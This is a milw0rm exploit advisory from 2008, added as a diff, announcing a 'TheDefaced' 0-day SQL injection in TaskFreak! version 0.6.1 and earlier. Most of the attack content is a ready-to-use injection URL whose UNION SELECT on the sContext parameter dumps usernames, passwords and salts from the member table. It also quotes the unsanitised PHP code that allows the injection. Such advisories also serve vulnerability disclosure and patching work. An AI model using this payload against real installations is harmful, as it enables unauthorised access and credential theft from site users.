@@ -1,0 +1,62 @@
+########################################################################################
+###########  _______ __           _____         ___                      __  ###########
+########### |_     _|  |--.-----.|     \.-----.'  _|.---.-.----.-----.--|  | ###########
+###########   |   | |     |  -__||  --  |  -__|   _||  _  |  __|  -__|  _  | ###########
+###########   |___| |__|__|_____||_____/|_____|__|  |___._|____|_____|_____| ###########
+###########                                                                  ###########
+###########                           TheDefaced.org                         ###########
+###########             TheDefaced Security Team Presents An 0-day.          ###########
+###########                    TaskFreak! SQL Injection                      ###########
+########################################################################################
+# Product:                                                                             #
+# TaskFreak!/Discovered in <==0.6.1                                                    #                                                                          
+#                                                                                      #
+# Vuln:                                                                                #
+# Remote SQL Injection                                                                 #
+#                                                                                      #
+# Description:                                                                         #
+#  The request is not sanitized before it is concatenated to the query.                #
+#                                                                                      #
+# Patch:                                                                               #
+# 	No Patch                                                                       #
+#                                                                                      #
+# Other:                                                                               #
+#                                                                                      #
+# You must have a login to the script for this to work,                                #
+#                                                                                      #
+# magic_quotes_gpc must be set to Off in the php configuration                         #
+#                                                                                      #
+# URL Form:                                                                            #
+# Be sure to change " prefix " sUser " & " sContext " Accordingly!                     #
+#                                                                                      #
+# index.php?sProject=0&id=&mode=save&sort=deadlineDate&dir=1&show=today&sUser=1        # 
+# &sContext=1'+GROUP+BY+1+union+all+select+1,2,3,4,5,                                  #
+# concat(username,char(58),password,char(58),salt)                                     #
+# ,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+from+prefix_member/*             #
+#                                                                                      #
+#                                                                                      #
+# The following URL will pull and display all usernames passwords and salts from the...#
+# prefix_member column                                                                 #
+#                                                                                      #
+########################################################################################
+# The following code in the script is vulnerable...                                    #
+#                                                                                      #
+# [PHP]                                                                                #
+#                                                                                      #
+#  if ($_REQUEST['sContext']) {                                                        #
+#	$pContext = $_REQUEST['sContext'];                                             #
+#	$objItemList->addWhere('context = \''.$pContext.'\'');                         #
+#    $pLink=Tzn::concatUrl($pLink,'sContext='.$pContext);                              #
+#							}                              #
+# [/PHP]                                                                               #
+#                                                                                      #
+#                                                                                      #
+#                                                                                      #
+#                                                                                      #
+##################################################################################################
+#                                           Contact Us                                           #
+##################################################################################################
+#                                WebSite: http://www.thedefaced.org                              #
+##################################################################################################
+
+# milw0rm.com [2008-01-12]
